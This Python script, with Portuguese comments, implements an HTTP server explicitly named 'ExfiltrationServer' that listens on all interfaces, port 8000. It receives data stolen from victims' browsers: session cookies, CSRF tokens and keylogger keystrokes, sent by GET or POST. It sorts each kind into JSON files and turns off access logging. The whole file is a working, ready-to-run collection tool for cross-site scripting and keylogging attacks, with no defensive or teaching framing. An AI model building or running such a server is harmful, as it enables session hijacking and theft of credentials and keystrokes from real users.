from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
import json
from urllib.parse import urlparse, parse_qs

# Função para salvar dados organizadamente
def save_data(data_type, data):
    filename = f"{data_type}_data.json"
    try:
        # Carregar dados existentes, se o arquivo já existir
        with open(filename, "r") as file:
            existing_data = json.load(file)
    except FileNotFoundError:
        existing_data = []

    # Adicionar os novos dados
    existing_data.append(data)

    # Salvar novamente no arquivo
    with open(filename, "w") as file:
        json.dump(existing_data, file, indent=4)

# Classe do servidor
class ExfiltrationServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Evita logs de acessos padrão no terminal
        return

    def do_GET(self):
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
        logging.info(f"GET request received: {self.path}")

        # Extrair parâmetros da URL
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)

        # Identificar tipo de dado (baseado nos parâmetros recebidos)
        if "cookies" in params:
            save_data("cookies", params["cookies"][0])
            logging.info(f"Cookies captured: {params['cookies'][0]}")
        elif "csrf_token" in params:
            save_data("csrf_tokens", params["csrf_token"][0])
            logging.info(f"CSRF Token captured: {params['csrf_token'][0]}")
        else:
            save_data("other", params)
            logging.info(f"Other Data captured: {params}")

        # Responder ao cliente
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received!")

    def do_POST(self):
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

        # Extrair conteúdo do corpo da requisição
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Processar os dados recebidos no corpo
        try:
            # Verificar se é JSON
            data = json.loads(post_data)
            if "key" in data:  # Identificar keylogger
                save_data("keylogger", data)
                logging.info(f"Keylogger data received: {data}")
            elif "cookies" in data:
                save_data("cookies", data["cookies"])
                logging.info(f"Cookies captured via POST: {data['cookies']}")
            elif "csrf_token" in data:
                save_data("csrf_tokens", data["csrf_token"])
                logging.info(f"CSRF Token captured via POST: {data['csrf_token']}")
            else:
                save_data("other", data)
                logging.info(f"Other Data captured via POST: {data}")
        except json.JSONDecodeError:
            # Caso não seja JSON, processa como form-urlencoded
            parsed_data = parse_qs(post_data)
            if "cookies" in parsed_data:
                save_data("cookies", parsed_data["cookies"][0])
                logging.info(f"Cookies captured via POST: {parsed_data['cookies'][0]}")
            elif "csrf_token" in parsed_data:
                save_data("csrf_tokens", parsed_data["csrf_token"][0])
                logging.info(f"CSRF Token captured via POST: {parsed_data['csrf_token'][0]}")
            else:
                save_data("other", parsed_data)
                logging.info(f"Other Data captured via POST: {parsed_data}")

        # Responder ao cliente
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received!")

# Configurar o endereço e porta do servidor
server_address = ('0.0.0.0', 8000)
httpd = HTTPServer(server_address, ExfiltrationServer)

print("Servidor de Exfiltração rodando em http://0.0.0.0:8000")
httpd.serve_forever()
